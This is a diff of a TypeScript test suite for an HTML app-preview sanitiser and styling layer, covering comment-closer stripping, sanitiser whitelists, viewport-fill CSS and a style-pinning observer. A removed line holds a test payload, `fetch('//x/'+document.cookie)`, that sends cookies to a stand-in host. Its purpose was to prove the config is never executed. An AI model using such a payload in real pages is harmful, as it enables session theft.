@@ -21,8 +21,21 @@ import {
   extractPalette,
   sanitizeAppHtml,
   applyPhoneViewportFill,
+  applyDesktopViewportFill,
+  applyChromeContrast,
+  applyPreviewChrome,
   pinPhoneFillStyle,
+  pinDesktopFillStyle,
+  pinChromeContrastStyle,
+  pinPreviewChromeStyles,
+  watchPreviewChromePin,
+  stripOrphanCommentClosers,
   PHONE_FILL_STYLE_ID,
+  DESKTOP_FILL_STYLE_ID,
+  DESKTOP_FILL_CSS,
+  CHROME_CONTRAST_STYLE_ID,
+  CHROME_CONTRAST_CSS,
+  PREVIEW_CHROME_STYLE_ID,
   HTML_APP_SURFACE_VERSION,
 } from "../html-app-surface";
 import { deriveBindingSource } from "../derive-binding-source";
@@ -84,6 +97,32 @@ describe("安全边界还是 DOMPurify —— 同源不等于放开", () => {
   });
 });
 
+describe("捞开注释后不许留下裸 -->", () => {
+  it("aside 后面的 --> 要摘掉，说明注释里的 --> 不动", () => {
+    const fished =
+      "<html><body>" +
+      "<aside class='w-16'>侧</aside> -->\n" +
+      "<!-- 主正文 <main> -->\n" +
+      "<header>满电青年</header><main>正文</main></body></html>";
+    const out = stripOrphanCommentClosers(fished);
+    expect(out).toContain("<aside");
+    expect(out).toContain("<!-- 主正文 <main> -->");
+    expect(out).not.toMatch(/<\/aside[^>]*>\s*-->/i);
+    expect(sanitizeAppHtml(fished)).not.toMatch(/<\/aside[^>]*>\s*-->/i);
+  });
+
+  it("消毒入口接上了 —— 只测函数不接线会假绿", () => {
+    const src = readFileSync(
+      [`client/src/pages/sliderule/live-runtime/html-app-surface.tsx`,
+       `src/pages/sliderule/live-runtime/html-app-surface.tsx`]
+        .map(c => resolve(process.cwd(), c))
+        .find(c => existsSync(c))!,
+      "utf8"
+    ).replace(/\/\*[\s\S]*?\*\//g, "").replace(/\/\/.*$/gm, "");
+    expect(src).toContain("stripOrphanCommentClosers(markup");
+  });
+});
+
 describe("配色是读出来的，不是执行出来的", () => {
   it("嵌套色阶读得出", () => {
     const p = extractPalette(PAGE);
@@ -105,14 +144,26 @@ describe("配色是读出来的，不是执行出来的", () => {
     expect(extractPalette("<html><body>没有配置</body></html>")).toEqual({});
   });
 
-  it("配置里夹了函数调用也不会被执行 —— 只挑 #hex 出来", () => {
-    const evil = `<script>tailwind.config = { theme: { extend: { colors: {
-      brand: { 500: '#13b58c' },
-      evil: fetch('//x/'+document.cookie)
-    } } } };</script>`;
-    const p = extractPalette(evil);
-    expect(p.brand).toEqual({ "500": "#13b58c" });
-    expect(p.evil).toBeUndefined();
+  it("读得动主题锁注入的 chrome/background", () => {
+    // 跟 Python theme_tokens._theme_config 同一形状。键必须是标识符，
+    // 值必须是 '#rrggbb'——extractPalette 不执行 JS、也不认 var(--x)。
+    const html = `<script>
+/* sliderule-theme-tokens */
+tailwind.config = { theme: { extend: { colors: {
+  background: '#0f172a',
+  foreground: '#f8fafc',
+  chrome: '#1e293b',
+  card: '#1e293b',
+  primary: '#0ea5e9',
+  muted: '#334155',
+  border: '#475569'
+}
+} } };
+</script>`;
+    const p = extractPalette(html);
+    expect(p.chrome).toBe("#1e293b");
+    expect(p.background).toBe("#0f172a");
+    expect(p.primary).toBe("#0ea5e9");
   });
 });
 
@@ -143,6 +194,14 @@ describe("四件事各自的接线点都在", () => {
     expect(src).not.toMatch(/textContent\s*===/);
   });
 
+  it("切页监听赶在 srcdoc 之前 —— 后挂会错过同步 load", () => {
+    const loadAt = src.indexOf('addEventListener("load"');
+    const srcdocAt = src.indexOf("frame.srcdoc = doc");
+    expect(loadAt).toBeGreaterThan(0);
+    expect(srcdocAt).toBeGreaterThan(loadAt);
+    expect(src).toContain("stopPropagation");
+  });
+
   it("④ 游标：hover 报出带绑定的元素", () => {
     expect(src).toContain("onHoverBinding");
     expect(src).toContain("mouseover");
@@ -158,6 +217,25 @@ describe("四件事各自的接线点都在", () => {
 
   it("data-page-id 在消毒白名单里 —— 漏了菜单点不动且不报错", () => {
     expect(sanitizeAppHtml(PAGE)).toContain('data-page-id="p2"');
+  });
+
+  it("⑤ 抽屉：wireOverlays 打在 contentDocument 上，且在填数之后", () => {
+    /**
+     * 页面 script 已被摘掉，开/关只能宿主做。挂在 applyBindings 之后：
+     * 行是打孔克隆出来的，先填再接线。把这行拿掉，菜单会被打开态遮罩盖住。
+     */
+    const applyAt = src.indexOf("applyBindings(d.body");
+    const wireAt = src.indexOf("wireOverlays(d)");
+    expect(applyAt).toBeGreaterThan(0);
+    expect(wireAt).toBeGreaterThan(applyAt);
+  });
+
+  it("hidden / data-state 过消毒 —— 漏了关上的抽屉会被剥开", () => {
+    const out = sanitizeAppHtml(
+      '<html><body><div class="fixed inset-0" hidden data-state="closed">抽屉</div></body></html>'
+    );
+    expect(out).toMatch(/\shidden(?:\s|=|>)/);
+    expect(out).toContain('data-state="closed"');
   });
 
   it("绑定词汇一个不漏地过消毒", () => {
@@ -286,7 +364,157 @@ describe("手机页铺满视口", () => {
     );
     const surface = strip(pick("src/pages/sliderule/live-runtime/html-app-surface.tsx"));
     expect(surface).toContain("buildDocument(html, fillPhone)");
-    expect(surface).toContain("if (fillPhone)");
-    expect(surface).toContain("pinPhoneFillStyle(d)");
+    expect(surface).toContain("applyPreviewChrome(clean, fillPhone)");
+    expect(surface).not.toContain("applyDesktopViewportFill(clean)");
+    expect(surface).not.toContain("applyPhoneViewportFill(clean)");
+    expect(surface).not.toContain("applyChromeContrast(filled)");
+    expect(surface).toContain("watchPreviewChromePin(d, fillPhone)");
+    const pinFn = surface.slice(
+      surface.indexOf("export function pinPreviewChromeStyles"),
+      surface.indexOf("export function watchPreviewChromePin")
+    );
+    expect(pinFn).toContain("PREVIEW_CHROME_STYLE_ID");
+    expect(pinFn.match(/pinFillStyle/g)?.length).toBe(1);
+    expect(pinFn).not.toContain("pinDesktopFillStyle");
+    expect(pinFn).not.toContain("pinPhoneFillStyle");
+    expect(pinFn).not.toContain("pinChromeContrastStyle");
+  });
+});
+
+describe("桌面页铺满视口", () => {
+  it("居中卡片 CSS 注入且幂等 —— 不删原文，用覆盖撑满", () => {
+    const src =
+      '<html><head></head><body class="min-h-screen flex items-center justify-center p-10">' +
+      '<div class="max-w-6xl mx-auto"><aside></aside><main class="ml-16">卡</main></div>' +
+      "</body></html>";
+    const once = applyDesktopViewportFill(src);
+    expect(once).toContain(`id="${DESKTOP_FILL_STYLE_ID}"`);
+    expect(once).toContain('body>[class*="mx-auto"]');
+    expect(once).toContain("max-w-6xl");
+    expect(once).toContain("ml-16");
+    expect(applyDesktopViewportFill(once)).toBe(once);
+  });
+
+  it("不许抄手机那条 body>*{margin-left:0} —— 会抹掉侧栏让位", () => {
+    expect(DESKTOP_FILL_CSS).not.toContain("body>*{");
+    expect(DESKTOP_FILL_CSS).not.toContain("flex-direction:column");
+  });
+
+  it("Tailwind 后注的样式要把桌面铺满层再钉到 head 末尾", () => {
+    const doc = document.implementation.createHTMLDocument("");
+    const tw = doc.createElement("style");
+    tw.id = "tw";
+    doc.head.appendChild(tw);
+    pinDesktopFillStyle(doc);
+    expect(doc.head.lastElementChild?.id).toBe(DESKTOP_FILL_STYLE_ID);
+    const later = doc.createElement("style");
+    later.id = "tw-late";
+    doc.head.appendChild(later);
+    pinDesktopFillStyle(doc);
+    expect(doc.head.lastElementChild?.id).toBe(DESKTOP_FILL_STYLE_ID);
+  });
+});
+
+describe("浅色壳上的白字和高亮", () => {
+  it("对比层注入且幂等", () => {
+    const src =
+      '<html data-theme="light"><head></head><body>' +
+      '<header class="text-white"><nav aria-label="Breadcrumb">' +
+      '<a aria-current="page">当前</a></nav></header>' +
+      '<aside><a aria-current="page" class="text-white">甲</a></aside>' +
+      "</body></html>";
+    const once = applyChromeContrast(src);
+    expect(once).toContain(`id="${CHROME_CONTRAST_STYLE_ID}"`);
+    expect(once).toContain('html[data-theme="light"] header .text-white');
+    expect(once).toContain("aside nav a{box-sizing:border-box;width:100%;");
+    expect(CHROME_CONTRAST_CSS).toContain('aside [aria-current="page"]');
+    expect(CHROME_CONTRAST_CSS).toContain('nav[aria-label="Breadcrumb"]');
+    expect(CHROME_CONTRAST_CSS).toContain("min-width:16rem");
+    expect(CHROME_CONTRAST_CSS).toContain("bg-zinc-950");
+    expect(CHROME_CONTRAST_CSS).toContain("align-items:center");
+    expect(applyChromeContrast(once)).toBe(once);
+  });
+
+  it("Tailwind 后注要把对比层钉到 head 末尾", () => {
+    const doc = document.implementation.createHTMLDocument("");
+    doc.head.appendChild(doc.createElement("style")).id = "tw";
+    pinChromeContrastStyle(doc);
+    expect(doc.head.lastElementChild?.id).toBe(CHROME_CONTRAST_STYLE_ID);
+  });
+
+  it("铺满+对比合成一张；观察器跳过自己，对照 Tailwind skip-self", async () => {
+    /**
+     * ★ 满电青年 2026-08-20：两张表抢 lastElementChild 把主线程钉死。
+     * 标准答案抄 Tailwind `@tailwindcss-browser`：一张 output sheet，
+     * `if (node === sheet) continue`。变异：pinPreviewChromeStyles 再连调
+     * 两层 pin，或拿掉 skip-self 改回两层互踢，本条 last id / 源码必红。
+     */
+    const src = readFileSync(
+      resolve(
+        process.cwd(),
+        existsSync("client/src/pages/sliderule/live-runtime/html-app-surface.tsx")
+          ? "client/src/pages/sliderule/live-runtime/html-app-surface.tsx"
+          : "src/pages/sliderule/live-runtime/html-app-surface.tsx"
+      ),
+      "utf8"
+    );
+    const fn = src.slice(
+      src.indexOf("export function watchPreviewChromePin"),
+      src.indexOf("const TAILWIND_SRC")
+    );
+    expect(fn).toContain("Skip the output stylesheet itself to prevent loops");
+    expect(fn).toContain("if (node === ours) continue");
+    expect(fn).not.toContain("mo?.disconnect()");
+    expect(fn).not.toContain("pinDesktopFillStyle");
+    expect(fn).not.toContain("pinChromeContrastStyle");
+
+    const baked = applyPreviewChrome(
+      "<html><head></head><body><aside></aside></body></html>",
+      false
+    );
+    expect(baked).toContain(`id="${PREVIEW_CHROME_STYLE_ID}"`);
+    expect(baked).toContain('body>[class*="mx-auto"]');
+    expect(baked).toContain('html[data-theme="light"] header .text-white');
+    expect(applyPreviewChrome(baked, false)).toBe(baked);
+
+    const doc = document.implementation.createHTMLDocument("");
+    const mo = watchPreviewChromePin(doc, false);
+    expect(doc.head.lastElementChild?.id).toBe(PREVIEW_CHROME_STYLE_ID);
+    expect(doc.querySelectorAll(`#${PREVIEW_CHROME_STYLE_ID}`).length).toBe(1);
+    const sheet = doc.getElementById(PREVIEW_CHROME_STYLE_ID);
+    expect(sheet?.textContent).toContain('body>[class*="mx-auto"]');
+    expect(sheet?.textContent).toContain("min-width:16rem");
+    for (let i = 0; i < 6; i++) {
+      const late = doc.createElement("style");
+      late.id = `tw-late-${i}`;
+      doc.head.appendChild(late);
+      await new Promise(r => setTimeout(r, 0));
+    }
+    mo?.disconnect();
+    expect(doc.head.lastElementChild?.id).toBe(PREVIEW_CHROME_STYLE_ID);
+    expect(doc.querySelectorAll(`#${PREVIEW_CHROME_STYLE_ID}`).length).toBe(1);
+    pinPreviewChromeStyles(doc, false);
+    expect(doc.head.lastElementChild).toBe(sheet);
+  });
+
+  it("不先断开就两层互踢——这条是对照，钉死旧写法", async () => {
+    const doc = document.implementation.createHTMLDocument("");
+    let n = 0;
+    let mo: MutationObserver;
+    const pin = () => {
+      n += 1;
+      if (n > 40) {
+        mo.disconnect();
+        return;
+      }
+      pinDesktopFillStyle(doc);
+      pinChromeContrastStyle(doc);
+    };
+    mo = new MutationObserver(pin);
+    mo.observe(doc.head, { childList: true });
+    pin();
+    await new Promise(r => setTimeout(r, 30));
+    mo.disconnect();
+    expect(n).toBeGreaterThan(20);
   });
 });
